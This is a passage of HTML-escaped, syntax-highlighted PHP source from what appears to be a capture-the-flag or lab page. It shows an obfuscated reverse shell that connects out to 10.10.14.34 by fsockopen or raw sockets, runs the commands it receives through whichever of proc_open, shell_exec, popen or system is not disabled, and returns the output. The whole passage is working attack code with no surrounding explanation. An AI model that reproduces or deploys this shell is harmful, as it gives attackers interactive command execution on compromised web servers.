      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'proc_open'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'proc_open'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$handle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;proc_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pipe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pipe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pipe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;feof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pipes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;proc_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'shell_exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'shell_exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'popen'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'popen'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;feof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EPWc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JZlmOv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;ob_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ob_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$nofuncs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'no exec functions'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_callable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fsockopen'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fsockopen'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fsockopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tcp://10.10.14.34&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cd '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'quit'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CkLhPZUPboOwI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nofuncs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOL_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ipaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;socket_create&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cd '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'quit'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CkLhPZUPboOwI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;socket_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nofuncs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
